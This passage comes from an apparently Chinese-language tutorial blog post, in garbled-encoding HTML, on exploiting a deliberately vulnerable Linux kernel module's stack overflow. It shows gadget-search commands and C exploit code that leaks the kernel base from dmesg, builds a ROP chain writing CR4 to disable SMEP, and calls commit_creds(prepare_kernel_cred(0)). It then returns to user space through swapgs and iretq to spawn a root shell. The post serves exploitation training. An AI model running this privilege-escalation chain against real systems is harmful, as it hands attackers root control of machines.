class="title">stack_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// ä¸æ”¯æŒçš„å‘½ä»¤</span></span><br><span class="line">            <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module_init(stack_init);</span><br><span class="line">module_exit(stack_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="comment">// MODULE_AUTHOR(&quot;blackndoor&quot;);</span></span><br><span class="line"><span class="comment">// MODULE_DESCRIPTION(&quot;Module vuln overflow&quot;);</span></span><br></pre></td></tr></table></div></figure>






        <h1 id="â–²å¯»æ‰¾gadget"   >
          <a href="#â–²å¯»æ‰¾gadget" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²å¯»æ‰¾gadget" class="headerlink" title="â–²å¯»æ‰¾gadget"></a>â–²å¯»æ‰¾gadget</h1>
      
        <h2 id="ropper"   >
          <a href="#ropper" class="heading-link"><i class="fas fa-link"></i></a><a href="#ropper" class="headerlink" title="ropper"></a><code>ropper</code></h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file vmlinux --search <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªæ¯”è¾ƒæ…¢ï¼Œå®åœ¨ä¸æ¨è</p>

        <h2 id="objdump"   >
          <a href="#objdump" class="heading-link"><i class="fas fa-link"></i></a><a href="#objdump" class="headerlink" title="objdump"></a><code>objdump</code></h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d vmlinux -M intel | grep -E <span class="string">&#x27;ret|pop&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªæ¯”è¾ƒå¿«ï¼Œä¸è¿‡æŸ¥å‡ºæ¥çš„gadgetå¯èƒ½æ˜¯ä¸è¿ç»­çš„ï¼Œéœ€è¦ä»”ç»†è¾¨åˆ«ä¸€ä¸‹ï¼Œå¿…è¦æ—¶è¿˜éœ€è¦Gdbè°ƒè¯•è¿›å…¥vmlinuxä¸­è¿›è¡Œæ±‡ç¼–æŸ¥è¯¢ã€‚æ¯”å¦‚æŸ¥å‡ºæ¥çš„ç±»ä¼¼å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930111208.png" alt="image-20210930111201257"></p>
<p>å¯ä»¥çœ‹åˆ°<code>pop rax</code>ä¸‹å¹¶æ²¡æœ‰<code>ret</code>ï¼Œä½†æ˜¯ä¾ç„¶æŸ¥æ‰¾å‡ºæ¥äº†ï¼Œå…¶ä¸­<code>pop rax</code>å’Œ<code>pop rbx</code>ä¸æ˜¯è¿åœ¨ä¸€èµ·çš„ï¼Œç”¨çš„æ—¶å€™æ³¨æ„è¾¨åˆ«ã€‚</p>

        <h2 id="ROPgadget"   >
          <a href="#ROPgadget" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a><code>ROPgadget</code></h2>
      <p>ä¾ç„¶å¯ä»¥ç”¨ï¼Œä½†æœ‰æ—¶å€™å¯èƒ½æ¯”è¾ƒæ…¢ï¼Œå¯ä»¥å…ˆä¿å­˜ä¸‹æ¥ï¼Œç„¶åå†æ‰¾ï¼š</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary vmlinux | grep <span class="string">&quot;pop rdx ; ret&quot;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="ä¸€é”®è·å–"   >
          <a href="#ä¸€é”®è·å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€é”®è·å–" class="headerlink" title="ä¸€é”®è·å–"></a>ä¸€é”®è·å–</h2>
      <p>è¯¦è§ä¹‹å‰çš„é¡¹ç›®ä¸­çš„<code>getKernelROP</code>å‘½ä»¤ï¼Œå¸¸ç”¨gadgetï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½ç”¨çš„</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll" >PIG-007/kernelAll (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gitee.com/Piggy007/kernelAll" >PIG-007/kernelAll (gitee.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="ä¸€ã€Stackè¢«ä¿æŠ¤"   >
          <a href="#ä¸€ã€Stackè¢«ä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€Stackè¢«ä¿æŠ¤" class="headerlink" title="ä¸€ã€Stackè¢«ä¿æŠ¤"></a>ä¸€ã€Stackè¢«ä¿æŠ¤</h1>
      <p>è¿™é‡Œçš„è¢«ä¿æŠ¤æŒ‡çš„æ˜¯å¼€å¯äº†SMEPï¼Œç±»ä¼¼äºNXçš„æ ˆä¿æŠ¤ï¼Œå³å†…æ ¸æ— æ³•æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ã€‚</p>

        <h2 id="æ–¹æ³•ä¸€ï¼š"   >
          <a href="#æ–¹æ³•ä¸€ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h2>
      <p>é€šè¿‡ROPæ¥å…³é—­æ‰smepä¿æŠ¤ï¼Œè¿™æ ·å°±å¯ä»¥è¿›å…¥å†…æ ¸ä¹‹åå¯åŠ¨ç”¨æˆ·ç©ºé—´æˆ‘ä»¬è‡ªå·±æ„é€ çš„<code>commit_creds(prepare_kernel_cred(0))</code>æ¥å®Œæˆææƒï¼Œä¹‹åå†å¯ä¸€ä¸ªshellå³å¯è·å¾—ææƒä¹‹åçš„shellã€‚</p>

        <h2 id="1-è·å–åœ°å€"   >
          <a href="#1-è·å–åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è·å–åœ°å€" class="headerlink" title="1.è·å–åœ°å€"></a>1.è·å–åœ°å€</h2>
      <p>ç”±äºreadå‡½æ•°ä¸å¤ªæœ‰ä»€ä¹ˆåœ°å€çš„è¯»å–ï¼Œæ‰€ä»¥è¿™é‡Œåˆ©ç”¨dmesgæ¥è·å–åœ°å€</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">string</span>[] = <span class="string">&quot;Freeing SMP alternatives memory&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> found[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* execute dmesg and place result in a file */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Excecute dmesg...\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;dmesg &gt; /tmp/dmesg&quot;</span>);</span><br><span class="line">	<span class="comment">/* find: Freeing SMP alternatives memory*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Find usefull addr...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* file = fopen(<span class="string">&quot;/tmp/dmesg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="built_in">string</span>)) &#123;</span><br><span class="line">            <span class="built_in">strncpy</span>(found,line+<span class="number">53</span>,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(found,<span class="string">&quot;%p&quot;</span>,(<span class="keyword">void</span> **)&amp;addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(addr==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    dmesg error...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mainå‡½æ•°ä¸­</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line">memOffset = findAddr();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax_rbx_r12_rbp_ret = memOffset - <span class="number">0xCB5B47</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> movCr4Rax_pop_rbp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x01020F1C</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AAE78</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AC289</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br></pre></td></tr></table></div></figure>

<p>dmesgæ˜¯è·å–å†…æ ¸å¯åŠ¨çš„æ—¥å¿—ç›¸å…³ä¿¡æ¯ï¼Œè‡ªå·±å»å°è¯•ä¸€ä¸‹çŸ¥é“ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930112655.png" alt="image-20210930112655023"></p>

        <h2 id="2-å…³é—­SMEP"   >
          <a href="#2-å…³é—­SMEP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å…³é—­SMEP" class="headerlink" title="2.å…³é—­SMEP"></a>2.å…³é—­SMEP</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> payload[<span class="number">300</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p           = payload;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop rax;rbx;r12;rbp;ret;*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> poprax = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0xCB5B47</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;poprax,<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;    pop rax      at 0x%lx\n&quot;</span>, poprax);</span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(p,<span class="string">&quot;\xf0\x06\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);   <span class="comment">/* SMEP OFF rax*/</span></span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(p,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);   <span class="comment">/* rbx*/</span></span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(p,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);   <span class="comment">/* r12 */</span></span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>);   <span class="comment">/* rbp */</span></span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* mov cr4, rax;rbp;ret     */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> movcr4 = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x01020F1C</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;movcr4,<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;    mov CR4, RAX at 0x%lx\n&quot;</span>, movcr4);</span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>);   <span class="comment">/* rbp */</span></span><br><span class="line">p+=<span class="number">8</span>;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-ææƒ"   >
          <a href="#3-ææƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ææƒ" class="headerlink" title="3.ææƒ"></a>3.ææƒ</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getroot                        */</span></span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;getR,<span class="number">8</span>);</span><br><span class="line">p+=<span class="number">8</span>;</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-è¿”å›ç”¨æˆ·ç©ºé—´èµ·Shell"   >
          <a href="#4-è¿”å›ç”¨æˆ·ç©ºé—´èµ·Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-è¿”å›ç”¨æˆ·ç©ºé—´èµ·Shell" class="headerlink" title="4.è¿”å›ç”¨æˆ·ç©ºé—´èµ·Shell"></a>4.è¿”å›ç”¨æˆ·ç©ºé—´èµ·Shell</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* swapgs;ret           */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;    swapgs       at 0x%lx\n&quot;</span>, swapgs);</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;swapgs,<span class="number">8</span>);</span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* iretq                          */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;    iretq        at 0x%lx\n&quot;</span>, iretq);</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;iretq,<span class="number">8</span>);</span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* shell                          */</span></span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;sh,<span class="number">8</span>);</span><br><span class="line">p+=<span class="number">8</span>;</span><br></pre></td></tr></table></div></figure>


        <h2 id="5-è®¾ç½®å¯„å­˜å™¨ä¿å­˜å’Œæ¢å¤"   >
          <a href="#5-è®¾ç½®å¯„å­˜å™¨ä¿å­˜å’Œæ¢å¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-è®¾ç½®å¯„å­˜å™¨ä¿å­˜å’Œæ¢å¤" class="headerlink" title="5.è®¾ç½®å¯„å­˜å™¨ä¿å­˜å’Œæ¢å¤"></a>5.è®¾ç½®å¯„å­˜å™¨ä¿å­˜å’Œæ¢å¤</h2>
      <p>è¿›å…¥å†…æ ¸ç©ºé—´ROPé“¾å‰éœ€è¦ä¿å­˜ç¯å¢ƒï¼Œä»å†…æ ¸ç¯å¢ƒå›åˆ°ç”¨æˆ·ç©ºé—´èµ·shellä¹‹å‰éœ€è¦æ¢å¤ç¯å¢ƒã€‚</p>

        <h3 id="1-ä¿å­˜ç¯å¢ƒ"   >
          <a href="#1-ä¿å­˜ç¯å¢ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¿å­˜ç¯å¢ƒ" class="headerlink" title="(1)ä¿å­˜ç¯å¢ƒ"></a>(1)ä¿å­˜ç¯å¢ƒ</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_ss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">  <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">  <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">  <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">  : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>     );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ª<code>save_state</code>å‡½æ•°åœ¨å¤åˆ¶æ•°æ®é€šè¿‡<code>stack_write</code>å‡½æ•°æ ˆæº¢å‡ºè¿›è¡ŒROPä¹‹å‰éœ€è¦è°ƒç”¨ä¿å­˜ç”¨æˆ·ç©ºé—´çš„ç¯å¢ƒã€‚</p>

        <h3 id="2-æ¢å¤ç¯å¢ƒ"   >
          <a href="#2-æ¢å¤ç¯å¢ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ¢å¤ç¯å¢ƒ" class="headerlink" title="(2)æ¢å¤ç¯å¢ƒ"></a>(2)æ¢å¤ç¯å¢ƒ</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* user_cs                        */</span></span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;user_cs,<span class="number">8</span>);</span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* user_rflags                    */</span></span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;user_rflags,<span class="number">8</span>);</span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*stack of userspace   			  */</span>         </span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp <span class="title">asm</span><span class="params">(<span class="string">&quot;rsp&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)rsp;</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;sp,<span class="number">8</span>);</span><br><span class="line">p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* user_ss                        */</span></span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;user_ss,<span class="number">8</span>);</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªéƒ½æ˜¯æ”¾åœ¨ROPé“¾ä¸­ï¼Œæ”¾åœ¨shellä¹‹åã€‚</p>

        <h3 id="poc"   >
          <a href="#poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#poc" class="headerlink" title="poc"></a>poc</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span 